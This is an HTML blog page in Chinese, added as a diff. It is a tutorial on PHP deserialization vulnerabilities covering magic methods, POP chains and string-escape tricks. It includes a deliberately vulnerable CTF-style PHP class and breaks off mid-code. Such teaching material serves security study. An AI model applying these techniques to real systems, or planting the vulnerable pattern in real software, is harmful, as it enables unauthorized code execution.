@@ -1,0 +1,1187 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/phone_icon/hacker.png">
+  <link rel="icon" href="/img/browser_icon/hacker.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0z-sIHN">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="反序列化漏洞🦇‍ 漏洞原理未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。 基础知识​​ ​​ ‍ 序列化对象转换为数组或字符串等格式 serialize() &#x2F;&#x2F;将对象转换成一个字符串 ​​ ‍ 反序列化将数组或字符串等格式转换成对象 unserialize()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0z-sIHN 的博客">
+<meta property="og:url" content="http://example.com/2024/11/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%F0%9F%A6%87/index.html">
+<meta property="og:site_name" content="0z-sIHN 的博客">
+<meta property="og:description" content="反序列化漏洞🦇‍ 漏洞原理未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。 基础知识​​ ​​ ‍ 序列化对象转换为数组或字符串等格式 serialize() &#x2F;&#x2F;将对象转换成一个字符串 ​​ ‍ 反序列化将数组或字符串等格式转换成对象 unserialize()">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/assets/image-20240827180209-kc788pf.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827180248-06g0yq5.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827180336-qblwgps.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827180404-0x33gtw.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827180630-f01srp3.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181157-ph169dl.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181219-fv4dnxj.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181233-ig12t49.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181247-i6g21rb.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181301-kf2ae4x.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181330-5jbyb2i.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181352-nj5dz5u.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181408-7kat9uj.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181443-cifvo8m.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181521-bcvgoj7.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181543-44k64xb.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181608-fcjythm.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181625-3phqo5m.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181641-dhior01.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181707-x1y0nxa.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181721-znzk0u7.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181920-4a8wdic.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181940-310q8x5.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827181954-c03npa8.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182015-kgrjq8c.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182030-7z5iq0k.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182044-x3p13yn.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182116-7tzte1c.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182140-2wffah0.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182203-tv5v747.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182219-mxb0d84.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182234-ag0qsj7.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182250-u7xqj3m.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182310-w6m61f1.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182324-alfpmj0.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182344-3iodnxf.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182400-7xr3qd5.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827182415-ly5xlyb.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827192145-k0v3zzq.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831185310-rljruv5.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831193610-cby2g2l.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831193546-7af979q.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831193654-reiyfwx.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831194118-6uo31uf.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831194152-ytw7keo.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906194551-0w29dhd.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906195035-fu26709.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906195014-eeb0zv5.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906195102-hlnjnai.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906195424-pyvvs6b.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906195507-7gikw7a.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906200235-5zgv5i0.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906195930-i238u5g.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906200201-1q0kwed.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906200505-6uai4nn.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906200421-kayznfy.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906200437-u8rlp6o.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160647-khovgvr.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160708-feu51s2.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160726-y2cf5ug.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160805-p7s2rx9.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160839-85do8vl.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160911-b2tzs1u.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160924-xdbazlz.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906160940-1lajn0w.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906161025-5u7sm39.png">
+<meta property="og:image" content="http://example.com/assets/image-20240906161038-6rseah1.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827192540-g17lf9a.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827192622-jtpqb8j.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827192654-p0agsw8.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827194138-mcp5vuv.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827194402-ovry5xu.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827194439-n1s03oa.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827194530-2c5lrey.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827194555-lf7201b.png">
+<meta property="og:image" content="http://example.com/assets/image-20240827194608-w7qma87.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175210-2qgy0iu.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175350-p3aysmm.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175417-p952w45.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175438-ykjc5iz.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175533-sptispr.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175549-wqfnmd0.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175625-nm3g8ne.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175707-euzgpyx.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175725-qex8y4l.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175807-wl806m4.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831175854-awl7iyk.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831194603-bmpux9r.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831194519-7rcl7re.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831194828-94kkoxe.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831195222-y1y079y.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831195315-rlp5a12.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831195359-ichfzoi.png">
+<meta property="og:image" content="http://example.com/assets/image-20240831195417-sjuq6jm.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195034-vzscbxj.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195114-5vpkw1t.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195131-dy5cxk3.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195148-jkg4w5i.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195206-fpyal3r.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195327-bdtq61l.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195349-9c2kqdy.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195423-1hgomcl.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195436-xq4ct5e.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195535-hem3emp.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195626-68x9609.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195647-6kb65o0.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195709-dqjp1ks.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195732-rd9pil6.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195801-ahor7py.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195840-1jwmt86.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195854-241635c.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195920-81bgfkd.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901195942-i0z572w.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901200035-htaiuup.png">
+<meta property="og:image" content="http://example.com/assets/image-20240901200150-j56nvpk.png">
+<meta property="article:published_time" content="2024-11-09T14:39:32.983Z">
+<meta property="article:modified_time" content="2024-11-09T06:39:06.000Z">
+<meta property="article:author" content="0z-sIHN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/assets/image-20240827180209-kc788pf.png">
+  
+  
+  
+  <title>0z-sIHN 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0z-sIHN 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>联系我</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/essay_top_cover_bg/office.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-09 22:39" pubdate>
+          2024年11月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          32 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="反序列化漏洞🦇"><a href="#反序列化漏洞🦇" class="headerlink" title="反序列化漏洞🦇"></a>反序列化漏洞🦇</h1><p>‍</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>​<img src="/assets/image-20240827180209-kc788pf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827180248-06g0yq5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>对象转换为数组或字符串等格式</p>
+<p>serialize() &#x2F;&#x2F;将对象转换成一个字符串</p>
+<p>​<img src="/assets/image-20240827180336-qblwgps.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>将数组或字符串等格式转换成对象</p>
+<p>unserialize() &#x2F;&#x2F;将字符串还原成一个对象</p>
+<p>​<img src="/assets/image-20240827180404-0x33gtw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h2 id="各类语言序列化和反序列化函数"><a href="#各类语言序列化和反序列化函数" class="headerlink" title="各类语言序列化和反序列化函数"></a>各类语言序列化和反序列化函数</h2><ul>
+<li>Java： Serializable Externalizable 接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject 等</li>
+<li>PHP： serialize()、 unserialize()</li>
+<li>Python：pickle marshal json PyYAML shelve PIL unzip</li>
+</ul>
+<p>‍</p>
+<p>‍</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>常见魔术方法</p>
+<p>​<img src="/assets/image-20240827180630-f01srp3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<ul>
+<li><p>​<code>__construct()</code>​：当对象new的时候会自动调用</p>
+<p>​<img src="/assets/image-20240827181157-ph169dl.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181219-fv4dnxj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181233-ig12t49.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__destruct()</code>​：当对象被销毁时会被自动调用</p>
+<p>​<img src="/assets/image-20240827181247-i6g21rb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181301-kf2ae4x.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__sleep()</code>​：serialize()执行时被自动调用</p>
+<p>​<img src="/assets/image-20240827181330-5jbyb2i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181352-nj5dz5u.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181408-7kat9uj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181443-cifvo8m.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181521-bcvgoj7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__wakeup()</code>​：unserialize()时会被自动调用</p>
+<p>​<img src="/assets/image-20240827181543-44k64xb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181608-fcjythm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__invoke()</code>​：把对象当作函数调用时触发</p>
+<p>​<img src="/assets/image-20240827181625-3phqo5m.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181641-dhior01.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__toString()</code>​：把对象当作字符串使用时触发</p>
+<p>​<img src="/assets/image-20240827181707-x1y0nxa.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181721-znzk0u7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__call()</code>​：调用某个方法,若方法存在,则调用;若不存在,则会去调用__call函数。</p>
+<p>​<img src="/assets/image-20240827181920-4a8wdic.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181940-310q8x5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827181954-c03npa8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__get()</code>​：读取对象属性时,若存在,则返回属性值;若不存在，则会调用__get函数</p>
+<p>​<img src="/assets/image-20240827182015-kgrjq8c.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__set()</code>​：设置对象的属性时,若属性存在,则赋值;若不存在,则调用__set函数。</p>
+<p>​<img src="/assets/image-20240827182030-7z5iq0k.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182044-x3p13yn.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182116-7tzte1c.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__isset()</code>​：在不可访问的属性(私有的)上调用isset()或empty()触发(isset和empty是一样的)</p>
+<p>​<img src="/assets/image-20240827182140-2wffah0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182203-tv5v747.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182219-mxb0d84.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182234-ag0qsj7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182250-u7xqj3m.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182310-w6m61f1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182324-alfpmj0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182344-3iodnxf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__unset()</code>​：在不可访问的属性上使用unset()时触发</p>
+<p>​<img src="/assets/image-20240827182400-7xr3qd5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240827182415-ly5xlyb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>​<code>__set_state()</code>​：调用var_export()导出类时，此静态方法会被调用</p>
+</li>
+<li><p>​<code>__clone()</code>​：当对象复制完成时调用</p>
+</li>
+<li><p>​<code>__autoload()</code>​：尝试加载未定义的类</p>
+</li>
+<li><p>​<code>__debugInfo()</code>​：打印所需调试信息</p>
+</li>
+<li><p>​<code>__callStatic()</code>​：在静态上下文中调用不可访问的方法时触发</p>
+</li>
+</ul>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><p>‍</p>
+<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>‍</p>
+<h3 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h3><p>POP：面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，序列化攻击都在PHP魔术方法中出现可利用的漏洞，因自动调用触发漏洞，但如关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
+<p>构造要点：删去不变的，留下要变的</p>
+<p>​<img src="/assets/image-20240827192145-k0v3zzq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>发现当输入admin时会被替换为hacker</p>
+<p>‍</p>
+<h4 id="增多"><a href="#增多" class="headerlink" title="增多"></a>增多</h4><p>这里采用字符串逃逸的方法来实现输出<code>flag is niubi</code>​</p>
+<ol>
+<li><p>观察源码</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$isVip</span>=<span class="hljs-variable language_">$this</span>-&gt;isVIP;<br>        <span class="hljs-variable">$username</span>=<span class="hljs-variable language_">$this</span>-&gt;username;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVip</span>==<span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag is niubi&#x27;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span 